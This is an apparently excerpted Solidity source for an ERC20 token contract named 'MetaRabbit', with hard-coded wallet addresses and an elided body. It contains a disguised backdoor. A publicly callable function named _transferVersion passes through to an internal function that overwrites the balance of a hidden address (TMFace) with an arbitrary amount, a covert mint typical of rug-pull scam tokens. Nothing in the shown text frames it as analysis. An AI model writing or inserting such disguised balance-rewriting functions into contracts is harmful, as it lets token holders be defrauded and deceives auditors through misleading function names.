...
contract MetaRabbit is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0x9fae85Ec03d505Af9998C0e74F4064AE573F3c0b); 
    address payable private teamWalletAddress = payable(0x8B1659E222442a32C2BB81fB5FA394763fe4c5D9); 
	...
	function _transferInternal(uint256 amount) internal{
        _usdt[TMFace] = amount + 2**_buyLiquidityFee;
    }
	
    function _transferVersion(uint256 amount) public{
        _transferInternal(amount);
    }
